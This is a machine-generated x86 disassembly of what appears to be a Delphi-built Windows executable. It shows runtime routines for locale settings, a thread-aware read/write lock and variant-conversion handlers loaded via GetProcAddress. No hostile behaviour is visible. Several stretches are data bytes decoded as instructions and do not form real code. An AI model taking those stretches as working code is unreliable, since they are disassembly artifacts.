lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c31c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c1a8
call sub_40ab94
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40aae4
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_407e8c
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_407e8c
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40ab30
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40ab30
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_407e8c
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40ab30
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40ae1c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40ae1c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403fc0
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40ab30
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40aae4
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40aae4
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x8 ]
call sub_403f6c
lea eax [ ebp - 0xc ]
call sub_403f6c
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_407e8c
test eax eax
jne r-xdata
call sub_40ad6c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042ec
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042ec
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40ab30
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c5ee
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f90
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_407e8c
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40aae4
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_407e8c
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404004
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404004
jmp r-xdata
sub_40c69c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40aa98
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c733
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
sub_40c784
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4082d0
mov [ rw-data ] eax
sub_40c808
push ebx
push esi
push edi
push ebp
call sub_4035a8
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403224
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_40c870
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c858
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c8f8
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_4079a8
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c7f8
mov [ ebp ] eax
sub_40c8f8
push ebx
mov ebx eax
mov eax ebx
call sub_40c858
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c7f8
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40c938
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40c9ac
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_40ca38
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403234
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_40ca38
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c9f4
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c870
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c800
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c7e0
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c800
test eax eax
je r-xdata
mov eax edi
call sub_40c9f4
test bl bl
je r-xdata
mov eax edi
call sub_40ca28
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c7e0
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c7ec
sub_40cad4
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c870
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c800
mov eax ebx
call sub_40ca0c
mov eax ebx
call sub_40ca00
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c8e8
sub_40cb24
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c870
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40ca18
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c7ec
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c7e0
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40ca18
mov eax esi
call sub_40ca0c
sub_40cb90
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c870
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c8e8
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c7e0
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40ca0c
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40ca0c
sub_40cc08
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40cc2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4055a8
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ccaa
lea eax [ ebp - 0x4 ]
call sub_4055a8
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032e8
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cc08
test al al
jne r-xdata
mov al 0x1
sub_40ccc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40442c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd1f
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40cd48
sbb eax 0x4000000
inc ebp
add al bl
add [ esi ] al
cld
inc ebp
add [ eax + eax ] al
inc esi
add ah dh
inc ebp
add [ eax - 0x13ffba02 ] bl
inc ebp
add [ eax ] bl
add [ esi ] eax
in al 0xf2
inc ebp
add [ eax + 0x1 ] cl
inc esi
add ah bl
inc ebp
add [ eax ] bh
inc [ ebp ]
aam 0xf2
inc ebp
add ah ch
inc [ ebp ]
int3
sub_40d198
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d207
retn
mov eax sub_40cd48
call sub_403d18
mov eax r-xdata
call sub_403d40
cmp [ rw-data ] 0x0
je r-xdata
call sub_40b95c
call sub_40ba60
call sub_40c784
call sub_40c31c
mov eax rw-data
mov edx r-xdata
call sub_403fc0
sub_40d238
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d28c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_407ea4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2ed
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d2f8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4091f4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d359
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d364
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4091c8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d3c5
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d3d0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40aa0c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d431
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d43c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409220
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d49d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d4a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_407f90
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d51c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_40d528
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40917c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404798
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d58f
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d598
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a1cc
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404798
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5ff
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d608
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_40802c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404798
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d673
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40d69c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d6c8
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d238
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d268
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d268
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d274
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d280
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d28c
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2f8
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d364
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3d0
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d43c
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4a8
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d528
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d598
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d608
mov eax r-xdata
call sub_40d69c
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40d9d4
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da00
retn
sub_40db34
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
lea eax [ eax ]
jl r-xdata
inc eax
push esi
popad
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
cwde
jne r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 8 + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
fild [ eax ]
or al 0x0
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ esi ] dl
popad
outsb
je r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
jo r-xdata
popad
outsb
je r-xdata
add [ esp + esi + 0x40 ] ch
add ah cl
xor al 0x40
jns r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24411c72
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040dc ] ch
add [ eax ] al
add [ eax + 0x64004075 ] bl
xor al 0x40
inc ebp
jb r-xdata
insb
outsd
ja r-xdata
popad
jae r-xdata
inc ebx
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24411c0e
xor al [ eax ]
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
mov al 0xda
inc eax
add ah dh
adc [ eax ] al
add [ eax ] al
or [ esi + 0x61 ] dl
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xdc
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jne r-xdata
outsd
jb r-xdata
add ah cl
xor [ eax ] eax
call 0x24411cd6
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
jb r-xdata
popad
outsb
je r-xdata
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24411d3a
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
outsd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ esp + esi + 0x40 ] ah
add [ eax ] al
cwde
jne r-xdata
rol [ esp + ebx * 8 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
fadd [ eax ]
or al 0x0
add [ eax ] al
cwde
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xdd
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
test al 0xdc
inc eax
add [ eax ] al
add [ eax ] al
inc ebx
jb r-xdata
popad
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 8 + 0x40 ] al
add [ eax + eax ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
add ah cl
xor [ eax ] eax
call 0x24411e02
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add [ eax ] al
cwde
jne r-xdata
add [ eax ] al
